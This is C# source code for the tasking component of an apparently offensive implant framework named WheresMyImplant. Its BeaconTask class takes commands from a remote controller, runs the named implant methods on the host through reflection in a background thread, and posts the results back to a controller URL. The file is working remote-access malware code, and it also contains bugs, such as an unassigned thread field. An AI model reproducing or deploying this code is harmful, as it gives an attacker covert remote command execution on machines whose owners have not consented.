using System;
using System.Reflection;
using System.Threading;

namespace WheresMyImplant
{
    ////////////////////////////////////////////////////////////////////////////////
    public class BeaconTask
    {
        private Thread thread { get; set; }
        private String command { get; set; }
        //private static String output = "";

        ////////////////////////////////////////////////////////////////////////////////
        public BeaconTask(String command, String uuid, String url)
        {
            this.command = command;
            Object parameters = new Object[] { command, uuid, url };
            Thread thread = new Thread(() => ExecuteTask(parameters));
            thread.Start();
        }

        ////////////////////////////////////////////////////////////////////////////////
        // This is a static method to be executed as a thread
        ////////////////////////////////////////////////////////////////////////////////
        public static void ExecuteTask(Object parameters)
        {
            Array array = (Array)parameters;
            String output = "";
            String[] taskingReturn = new String[0]; 
            try
            {   
                String method = "";
                String[] arguments = new String[0];
                ParseCommand((String)array.GetValue(0), ref method, ref arguments);
                MethodInfo methodInfo = typeof(Implant).GetMethod(method);
                output += (String)methodInfo.Invoke(null, arguments);
                Console.WriteLine(output);
                taskingReturn = new String[] { (String)array.GetValue(1), output };
            }
            catch (Exception error)
            {
                Console.WriteLine(error);
                output += error.ToString();
            }
            finally
            {
                WebServiceBeaconComs.Response((String)array.GetValue(2), (String)array.GetValue(1), taskingReturn);
            }

            return;
        }

        ////////////////////////////////////////////////////////////////////////////////
        //
        ////////////////////////////////////////////////////////////////////////////////
        internal static void ParseCommand(String command, ref String method, ref String[] arguments)
        {
            String[] commands = command.Split(
                new String[] { "\0" },
                StringSplitOptions.RemoveEmptyEntries
            );
            if (commands.Length > 0)
            {
                method = commands[0];
            }
            if (commands.Length > 1)
            {
                arguments = new String[commands.Length - 1];
                Array.Copy(commands, 1, arguments, 0, commands.Length - 1);
            }
        }

        ////////////////////////////////////////////////////////////////////////////////
        public Boolean isCompleted()
        {
            if (thread != null)
            {
                return thread.IsAlive;
            }
            else
            {
                return false;
            }
        }

        ////////////////////////////////////////////////////////////////////////////////
        public void killThread()
        {
            thread.Abort();
        }

        ////////////////////////////////////////////////////////////////////////////////
        //
        ////////////////////////////////////////////////////////////////////////////////
        public void Dispose()
        {
            thread.Join();
        }
    }
}